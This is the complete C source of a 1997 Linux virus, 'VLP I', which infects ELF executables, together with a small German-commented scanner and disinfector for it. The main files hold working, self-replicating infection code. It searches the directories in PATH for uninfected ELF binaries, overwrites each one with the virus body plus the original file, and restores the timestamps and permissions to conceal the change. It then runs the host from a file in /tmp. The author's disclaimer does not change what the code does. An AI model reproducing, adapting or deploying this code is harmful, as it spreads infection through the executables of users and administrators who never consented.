
/* --- Cut - Begin MAIN.C --- */

/* This is VLP I . Another method to infect ELF-execs.
 * Copyright (C) 1997 by Stealthf0rk of S V A T
 * This Virii contains *no* malicious code, but due to
 * bugs it is possible that you may get some damage on your system.
 * You use this progrma(s) on your own risk ! ! !
 * I'm not responsible for any damage you may get due to playing around
 * with this. Only run VLP with permission of the owner of the system you
 * wish to test VLP on.
 *
 * virii: $ cc -O2 -DDEBUG main.c get.c file_ops.c -o virii
 *	  $ strip virii
 * nacs:  $ cc -O2 nacs.c get.c file_ops.c 
 *
 * greets to NetW0rker and naleZ 
 *
 * how it works
 * in bash pseudo_code: 
 * 
 * find hostfile
 * cp hostfile tmp 	
 * grep THE_VIRCODE argv[0] > hostfile
 * cat tmp >> hostfile
 * grep THE_OLD_APPENDED_CODE_ON_ARGV[0] argv[0] > tmp
 * tmp
 *		 	
 *
 * if you wanna contact the SVAT-group, write to 
 * stealthf0rk,	stealth@cyberspace.org 
 */

#include "vx.h"
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

/* The filedescriptor for the LOG-file */

#ifdef DEBUG
FILE *fd;
#endif

int main(int argc, char **argv, char **envp)
{
   	char *s, *s2, *path, *dir;
        int i;
        char from[200];        
        
#ifdef DEBUG
       /* If U are angry do this:
        * setenv("PATH", "/root/VTEST/bin:/root/VTEST/bad:/root/VTEST/usr/bin:/root/VTEST/bad2", 1);
        */
        fd = fopen(TRACEFILE, "a");
#endif
        DFPRINTF("====== tracefile of stealthf0rk's VLP ==========\n");
        path = getenv("PATH");
        s = whereis(path, argv[0]);  /* return only static! -> */
        if (strcpy(from, s) == NULL) /* so we need a copy */
           	return -1;
        DFPRINTF("@f main: file of action is <%s>\n", from);
        i = infect(3, from);
        exechost(from, argv, envp);
        return 0;
}

/* --- Cut - End MAIN.C --- */


/* --- Cut - Begin FILE_OPS.C --- */

/* Thiz file contains the routines for writing the code etc. */

#include <stdio.h> /* .h files maybe different in different OS */
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>
#include <linux/dirent.h>

#include "vx.h"

#define TEMP "/tmp/temp"      /* with this generate the name of the EXE */
#define TMP  "/tmp/tmp"       /*  */

/*------------------------------*/

#ifdef DEBUG
extern FILE *fd; /* debugging */
#endif

struct utimbuf {
      time_t actime;
      time_t modtime;
}; 

/* ATA, ATH, ATD ... not found in my .h's */

extern int utime(char *, struct utimbuf*); 

/* infect <anz> files , Auftraggeber is <caller> */

int infect(int anz, char *caller)
{
	int i = 0, j = 0;
	char *dir, *f, *path;
        
        char file[200];
	struct stat status;               /* save time ... */       	
                
        path = getenv("PATH");
        if ((dir = getdir(path)) == NULL) /* find directory */
           	return -1;

   	while (i < anz && j < 10) { /* <anz> times  */
           	DFPRINTF("------------- new infection stack ----------\n");
                DFPRINTF("@f infect: directory of infection is <%s>\n", dir);
           	j++;
           	if ((f = gethost(dir, FILEPATH)) == NULL) 
                   	continue;                		
                strcpy(file, f);        	
                if (saveattribs(file, &status) < 0)
                   	continue;
                if (infect_host(file, caller) < 0)
                   	continue;
                if (restoreattribs(file, status) < 0)
                   	continue;
                i++;
                j = 0;
                DFPRINTF("@f infect: infected file is <%s>\n", file);
        }
        return i;   	
}


/* infect <host> directly  */

int infect_host(char *host, char *caller)
{
     	int in,out,
            r,w; 
     	const int vlength = VLENGTH;
     	char *buff;	  
         
     	if ((buff = (char*)malloc(vlength)) == NULL)
           	return -1;

/* copy	<host> to tempfile, open and truncate [the host] 
 * and copy the beginning (virus, vlength byte) of the running 
 * program [file 'caller'] to it.
 */   
     	if (cp(host, TMP) == -1)
        	return -1;
                
        DFPRINTF("@f infect_host: copied <%s> to <%s> \n", host, TMP);
     	if ((in = open(caller, O_RDONLY)) == -1)
        	return -1; 
     	if ((out = open(host, O_RDWR|O_TRUNC)) == -1)
     	   	return -1;
        DFPRINTF("@f infect_host: opened host <%s> and caller <%s>\n", host, caller); 
     	if ((r = read(in, buff, vlength)) == -1)
        	return -1; 
     	if ((w = write(out, buff, vlength)) == -1)
        	return -1;
     	close(in);
     	if ((in = open(TMP, O_RDWR)) == -1)
           	return -1;

/* append the rest of the original file to the host -> end of infection */
  
     	while ((r = read(in, buff, vlength)) > 0) {
        	if ((w = write(out, buff, r)) == -1)
           		return -1; 
     	}	
     	close(in);
     	close(out);
     	free(buff);
        DFPRINTF("@f infect_host: try to remove <%s>\n", TMP);
     	remove(TMP);
     	return 0;
} 



/*       --------------------  isinfected  --------------------- 
 *	 look if a 'detectstring' appears at the end of 'ffile' 
 *	 return 1 if so, 0 if not
 */
 
int isinfected (char *ffile)
{
        int out,r = 0;
   	char cmp[4] = {0};

   	DFPRINTF("@f isinfected: look at <%s>\n", ffile);
   	if ((out = open(ffile, O_RDONLY)) == -1)
           	return -1;
   	if ((r = lseek(out, VLENGTH + 1, SEEK_SET)) == -1)
           	return -1;  
   	if ((r = read (out, cmp, 3)) == -1) 
           	return -1;
   	if (strcmp("ELF", cmp) == 0) {
      		close(out);
      		return 1;
   	} else 
        { 
             	close(out); 
                return 0; 
        }
}  

/*       ------------  iself  ------------ 
 *	 look if 'host' is ELF
 *	 return 1 if so, 0 if not
 *       [buggy: an objectfile is also elf as a full executable {:-(8 ]
 */

int iself(char *host)
{
	int in,
            r = 0;
     	char mn[5] = {0x7f,0x45,0x4c,0x46,'\0'}, /* .ELF */
           buff[5] = {'\0'};
        DFPRINTF("@f iself: look at file <%s>\n", host);
     	if ((in = open(host, O_RDONLY)) == -1)
           	return -1;
     	if ((r = read(in, buff,4)) == -1)
        	return -1;
     	if (strcmp(buff, mn) == 0) {
        	close (in);
            	return 1;
        }
        else {
   		close (in);  
        	return 0; 
     	} 
}      

/* isclean() returns 1 if 'file' is clean
 * and 0 if not -  "clean" means healty,
 * ELF-executable and normal file (not dir ...)
 */

int isclean(char *file)
{
   	if (isregular(file) == 0)  /* prove this first !!! */
           	return 0;        
        if (isinfected(file) == 1)
           	return 0;
        if (iself(file) == 0)
           	return 0;
        return 1;
}

/* is <file> a normal one ? (links are, directorys not)
 * returns 1 if so
 */


int isregular(char *file)
{
   	struct stat status;
       
        DFPRINTF("@f isregular: <%s>\n", file); 
        if (stat(file, &status) == -1)
           	return 0;
        if (!S_ISREG(status.st_mode))
           	return 0;
        else
           	return 1;
}        
        

/*       ---------------    exechost     ------------------
 *	 execs the file wich follows the virii and wich must
 *	 be seppareted 
 */

int exechost(char *caller, char **arglist, char **envlist)
{
  
     	int i, j, in, out,
            r, w;
     	char *buff;    
	const int vlength = VLENGTH;
        char tempfile[20];
        struct stat status;
        

        DFPRINTF("@f exechost: caller = <%s> argv[0] = <%s>\n", caller, arglist[0]);
        DFPRINTF("=========== end of report =============\n");        
#ifdef DEBUG
        if (fd != stdout)
           	fclose(fd);
#endif     
 
     	if ((buff = (char*)(malloc(vlength))) == NULL)
        	return -1;
/* copy rest out of the program */

     	if ((in = open(caller, O_RDONLY)) == -1) 
        	return -1;             

/* Since the files wich are just executed are locked (can't be opened for
 * writing) and more than one of them can run at the same time [that means 
 * also more that one of a infected file ...] under UNIX we have to search 
 * for the next tempfile (/tmp/tempXYZ) we can use. 
 */
     	out = -1;
        j = 0;
        while (out < 0) {
           	sprintf(tempfile, "%s%d", TEMP, j++);
           	out = open(tempfile, O_RDWR|O_CREAT|O_TRUNC);
        }


/* from position 'vlength' ,the virus ends there  */

     	if (lseek(in, vlength, SEEK_SET) == -1)
        	return -1;
     	while ((r = read(in, buff, vlength)) > 0) {
        	if ((w = write(out, buff, r)) == -1)
           		return -1; 
     	}
     	close(in);
     	close(out);
     	free(buff);

        /* put the ORIGINAL attribs of the file to the tempfile */
     	saveattribs(caller, &status);
        restoreattribs(tempfile, status);
        
        execve(tempfile, arglist, envlist);
        while (1);
}
 

/* ------------------------------- cp ----------------------------
 * copy 'oldfile' to 'newfile' ,don't look for permissons
 */

int cp(char *oldfile,char *newfile)
 {
    char *buff;
    int nf,of,r,w;
 
    if ((buff = (char*)malloc(5000)) == NULL)
       	    return -1;
    if ((of = open(oldfile, O_RDONLY)) == -1)
            return -1;
    if ((nf = open(newfile, O_RDWR|O_CREAT|O_TRUNC)) == -1)
      	    return -1;   
    while ((r = read(of, buff, 5000)) > 0) {
       if ((w = write(nf, buff, r)) == -1)
            return -1; 
    }     
    DFPRINTF("@f cp: successfull copy of %s to %s\n", oldfile, newfile);
    free(buff);
    close(nf);
    close(of);
    return 0;
 }    

/*---------------------------------------------*/

int saveattribs(char *host, struct stat *status)
{       
        return stat(host, status);
}

/*---------------------------------------------*/

int restoreattribs(char *host, struct stat status)
{
	struct utimbuf time;
        int retval;
        
	if ((retval = chmod(host, status.st_mode)) < 0)
           	return retval;         
        time.actime = status.st_atime;
        time.modtime = status.st_mtime;
        return utime(host, &time);   
}

/* --- Cut - End FILE_OPS.C --- */



/* --- Cut - Begin GET.C --- */

/* this file contains the functions for find first/next :)
 * and all the others ...
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include "vx.h"

#ifdef DEBUG
extern FILE *fd;
#endif

/* the same as 'whereis' on the shell 
 * ATTENTION -  return only static - t.m. you can't 
 * use it for further actions.At the next call of whereis() the
 * buffer will be overwritten !!!
 * So its need to save the return in a copy before we call whereis()
 * again.
 */
 
char *whereis(char *path, char *prog)
{
#define IN_PATH path - _begin < pathlen + 2

   	static char file[200];
        int i = 0, pathlen;
        char *_begin;
        struct stat status;
                
        _begin = path;
        pathlen = strlen(path);
        if (strstr(prog,"/") != NULL) /* if its entered with path */
              	return prog;          /* -> gotcha */
        memset(file,'\0',200);
                
        /*  Loop until found or the pointer is not longer "in path".
         *  [the strXYZ() functions fuzzy the best debugger.
         *  If you want feel free to debug the virus. :-> ]
         */
         
        while (access(file, X_OK) != 0 && IN_PATH) {
                i = strcspn(path,":");  /* split string into dirs */
                strcpy(file, "");  	/* only for '\0' ! */
                strncat(file, path, i);   
                strcat(file, "/");
                strcat(file, prog);
                path = path + i + 1;
        }   
        if (!(IN_PATH))
           	return NULL;
        else {
        DFPRINTF("@f whereis: found file <%s>\n", file);
           	return file;        
        }        
#undef IN_PATH                
}

/* search randomly a directory (one from path)
 * and use this for further actions
 */

char *getdir(char *path)
{
#define NOT_IN_PATH path - _begin >= pathlen
#define RANDNUM (int)((double)strlen(path)*rand()/(RAND_MAX + 1.0))

   	static char dir[100];
        int n, r, not_found = 1, pathlen;
        char *_begin;
        static first = 1;
        
        _begin = path;
        pathlen = strlen(path);
        
        memset(dir,'\0',100);
        if (first)
           srand(getpid());
        first = 0;
               
   	while (not_found) {
           	r = RANDNUM;              
                path += r;
                if (r != 0) {
                   	path += strcspn(path, ":");
                        path ++;
                }
                if (NOT_IN_PATH) {
                   	path = _begin;
                        continue;
                }   
                not_found = 0;
                n = strcspn(path, ":");
                strcpy(dir, "");	/* ... */ 
                strncat(dir, path, n);   
                strcat(dir,"");		/* needed ??? ... */
        }   
        DFPRINTF("@f getdir: found directory <%s>\n", dir);
        return dir;
        
#undef NOT_IN_PATH        
#undef RANDNUM        
}

/* Search in 'dir' until a "good" file is found
 * or all of them are seen as "bad" .
 * In this case we come back later :-) .
 * If flag == 1 return includes path, if flag == 0 not.
 */

char *gethost(char *dir, int flag)
{
#define RANDNUM (int)((double)(found)*rand()/(RAND_MAX + 1.0)) /* uff */

   	static int first = 1, gen = 0;
        int r, i = 0;
        static struct dirent **filelist; 
        char *host, *path;
        static int found;
                
        path = getenv("PATH");

       /* Only 'randomize' at the first call .
        * Use scandir() to read out the directory.
        */
        if (first) {
           	if ((found = scandir(dir, &filelist, 0, 0)) <= 0)
                   	return NULL; 
                srand(getpid());
        }
        r = RANDNUM;        
        
        /* Get one of the file randomly. */
        
        if ((host = whereis(path, filelist[r]->d_name)) == NULL) 
               	return NULL;
        /* isclean means ready for infection: NOT a directory
         * NOT a textfile and NOT infected
         */
        while (isclean(host) != 1 && i < found) {
           	r = RANDNUM;         
                if((host = whereis(path, filelist[r]->d_name)) == NULL)
                   	return NULL;
                i++;
        }       
        first = 0;
        if (i >= found) 
           	return NULL;
        else {
        DFPRINTF("@f gethost: got host <%s>\n", host);      
           	if (flag == 0)	
                   	return filelist[r]->d_name; /* static */
                if (flag == 1) 
                   	return host; /* static, da host ein statischer */
                else	             /* return von *whereis(...) ist */		
                   	return NULL;                
        }                
#undef RANDNUM
}       

/* --- Cut - End GET.C --- */



/* --- Cut - Begin VX.H --- */

#include <sys/stat.h>

#define FILEONLY 0
#define FILEPATH 1
#define VLENGTH 8000 /* you may have to change this value */

/* be sure that /root/VTEST exists if DEBUG is turned on ... */

#ifdef DEBUG
   #define TRACEFILE "/root/VTEST/VIRtrace" 
   #define DFPRINTF(format, args...) fprintf(fd, format, ##args)
#else
   #define DFPRINTF(format,args...)
#endif


int infect(int, char*);
int exechost(char*, char**, char**);
int isinfected(char*);
int iself(char*);
int cp(char*, char*);
int restoreattribs(char*, struct stat);
int saveattribs(char*, struct stat*);
int infect_host(char*, char*); 
int isclean(char*);
int isregular(char*);

char *whereis(char*, char*);        
char *gethost(char*,int);
char *getdir(char*);


/* --- Cut - End VX.H --- */



/* --- Cut - Begin NACS.C --- */

/* Falls er sich mal aus dem Staub macht ... 
 *
 * $ cc -O2 nacs.c get.c file_ops.c -o nacs
 * $ strip nacs 
 *
 * NetW0rker/ S V A T
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include "vx.h"

#undef DEBUG
 
int scan_dir (char*, char*, int);
int disinfect(char*);

int main (int argc, char *argv[])
{
   	int FLAG = 0; /* == 0 -> nicht saeubern, == 1 saeubern */
 
        if (argc < 2) {
       	        printf("\n\n        nacs V 0.1 Beta   \\/ ><    Virusscanner fuer den LDV I\n\n"
                       "Aufruf: <nacs [directory] [logfile]> scannt 'directory' mit allen Unterverzeichnissen\n\n");
                exit(0);
        }        
  
     	if (argc == 4)
           	FLAG = 1;
     	scan_dir (argv[1], argv[2], FLAG);
        printf ("\n\nnacs: fertig\n\n");
        return 0;
}
 
/*------------------------------------------------- */
 
int scan_dir (char *directory, char *logfile, int flag) 
{ 
     	FILE *fd;
        char *fileapath; 
        struct dirent **filelist;
        struct stat buf;
        int count = 0,i = 0;
        char *detectstring = "VLP";
 
        fd = fopen(logfile, "w+"); /* return egal */
      	if ((fileapath = (char*) (malloc (1000))) == NULL)
           	perror (""), exit (1);
        if ((i = scandir (directory, &filelist, 0, 0)) == -1) // dir. scannen
           	perror (""), exit (2);
        for (count = 2; count < i; count++) {  /* alle gefundenen Dateien,ausser "." , ".."  */
           	if ((fileapath = strcpy (fileapath, directory)) == NULL) // Pfad
                perror (""), exit (3);
                fileapath = strcat (fileapath, "/");  /* Trenner */
                if ((fileapath = strcat (fileapath, filelist[count]->d_name)) == NULL) // + Datei
                   	perror (""), exit (4);
                stat (fileapath, &buf); 
                if ((buf.st_mode & S_IFDIR) == S_IFDIR) /* falls Unterverzeichniss */
                   	scan_dir (fileapath, logfile, flag); /* rekursiv weiter */
                else { /* sonst scannen */
                        printf("\r                                     ");
                        printf("                                     \r");
                        printf("Datei <%s> ist ", fileapath);
                        if (isinfected (fileapath)) {
                           	if (fd != NULL)
                                   	fprintf(fd, "Datei <%s> ist infiziert.", fileapath);
                           	printf ("infiziert");
                                if (flag) {
                                   	disinfect(fileapath);
                                        printf(" ... I disinfect ...");
                                        if (fd != NULL)
                                           	fprintf(fd, " ... I disinfect ...");
                                }        
                        if (fd != NULL)
                           	fprintf(fd, "\n");
                        }
                        else 
                           	printf("sauber");  
                        fflush(stdout);
                } /* else      */
        } /* for */
        return count;
}


int disinfect(char *file)
{
   	int in, out, r;
        char *buf;        
                
        buf = (char*)malloc(10000);
        if (buf == NULL)
           	perror(""), exit(1);
        cp(file, "./tmp");
        in = open("./tmp", O_RDWR);
        out = open(file, O_RDWR|O_TRUNC);
        lseek(in, VLENGTH, SEEK_SET); /* ueber virus wegSEEKEN */
        while ((r = read(in, buf, 10000)) > 0) /* cleanen teil kopieren */
           	write(out, buf, r);
        close(in);
        close(out);
        remove("./tmp");
        return 0;
}

/* --- Cut - End NACS.C --- */

